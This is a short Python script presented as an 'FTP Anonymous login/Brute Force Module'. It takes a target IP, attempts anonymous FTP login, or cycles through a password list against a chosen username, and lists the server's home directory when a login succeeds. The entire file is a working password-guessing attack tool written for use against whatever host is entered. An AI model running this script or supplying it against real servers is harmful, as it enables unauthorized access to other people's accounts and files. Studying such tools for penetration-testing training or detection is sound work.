#!/usr/bin/python3


import ftplib
import re
import sys, time, os

validIP = re.compile('^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$')
line = '------------------------------------'
i = 0
	
## -- Initialization -- ##
def Start0():
	print("Welcome to the FTP Anonymous login/Brute Force Module")
	print("Target Host IP required")
	print("Target Host IP List, Password List are Optional")
	print("--------------------------------------------------------")
	print("Option 1: Anonymous Login")
	print("Option 2: Brute Force")
	Start1()

## -- Gathering target host information. -- ##
def Start1():
	ftpTarget = input("Target Host: ")
	if validIP.match(ftpTarget):
		ftpCheck(ftpTarget)
		Start2(ftpTarget)
	else:
		print('Please enter a valid IP')
		Start1()

## -- Selecting anon or username logins -- ##
def Start2(ftpTarget):
	answeR = input('Select an Option. [1]: ')
	if(answeR == '' or answeR == '1'):
		ftpAnon(ftpTarget)
	elif(answeR == '2'):
		ftpinitBF(ftpTarget)


## -- pre check on target host to determine if it is up/accepting FTP connections -- ##
def ftpCheck(ftpTarget):
	ftp = ftplib.FTP(ftpTarget)
	try:
		ftp.connect()
		return()
	except Exception as E:
		print('Target Host down or FTP is being filtered by Firewall')
		Start1()

## -- FTP anonymous login section -- ##
def ftpAnon(ftpTarget):
	ftp = ftplib.FTP(ftpTarget)	
	try:
		ftp.login()
		print('Anonymous Login Successful! :D')
		print(line)
		print('--------HOME DIRECTORY LIST---------')
		print(line)
		ftp.retrlines('LIST')
		ftp.quit()
	except Exception as E:
		print('Anonymous Login Unsuccessful :(')

##  -- Username as PW bruteforce section -- ##
def ftpinitBF(ftpTarget):
	ftpuName = input('Enter username to BF: ')
	ftppwFile = input("Password List File: ")
	if (os.path.isfile (ftppwFile)):
		answeR = input(('Username: %s - List: %s Loaded. Confirm [Y/n]: ' % (ftpuName, ftppwFile)))
		if(answeR == '' or answeR == 'y'):
			ftpBF1(ftpTarget, ftpuName, ftppwFile)
		elif(answeR == 'n'):
			ftpinitBF(ftpTarget)
	else:
		print('Please enter a valid file')
		ftpinitBF(ftpTarget)
		
def ftpBF1(ftpTarget, ftpuName, ftppwFile):
	global i
	total = 0
#	ftp = ftplib.FTP(ftpTarget)
	with open(ftppwFile, 'rb') as Counter:
		for line in Counter:
			total = total + 1 
	with open(ftppwFile, 'r') as pwList:
		for pW in pwList:
			try:
				ftp = ftplib.FTP(ftpTarget)
				response = ftp.login(ftpuName, pW.strip())
				print(line)
				print('--------HOME DIRECTORY LIST---------')
				print(line)
				ftp.retrlines('LIST')
				ftp.quit()
				exit()
			except Exception as E:
				print('lame')
				i = i + 1
				progress(i,total)
				time.sleep(.01)
				pass
## -- End FTP BF section -- ##
## -- Progress bar -- ##
def progress(count, total):
	bar_len = 38
	filled_len = int(round(bar_len * count / float(total)))
	percents = round(100.0 * count / float(total), 1)
	bar = '#' * filled_len + '=' * (bar_len - filled_len)
	space = '{message: <0}'.format(message='')
	sys.stdout.write('%s/%s || %s [%s] %s%s Exhausted\r' % (i, total, space, bar, percents, '%'))
	sys.stdout.flush()

if __name__ == '__main__':
	try:
		Start0()
	except Exception as E:
		print(E)
	except KeyboardInterrupt:
		print('-----------------------------------------------------')
		print("\nUser Interrupt. Exiting FTP Brute Force Attack Module")
		print('-----------------------------------------------------')

